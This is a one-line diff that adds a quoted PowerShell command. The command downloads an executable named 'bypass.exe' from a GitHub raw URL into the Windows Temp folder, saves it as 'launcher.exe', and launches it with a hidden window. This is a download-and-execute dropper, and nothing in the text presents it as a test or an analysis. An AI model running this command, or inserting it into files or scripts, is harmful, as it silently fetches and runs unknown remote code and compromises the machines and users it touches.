@@ -1,0 +1,1 @@
+"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $zipPath='C:\\Windows\\Temp\\launcher.exe'; (New-Object System.Net.WebClient).DownloadFile('https://github.com/tkankkoa-ai/ok/raw/refs/heads/main/bypass.exe', $zipPath); Start-Process $zipPath  -WindowStyle Hidden"
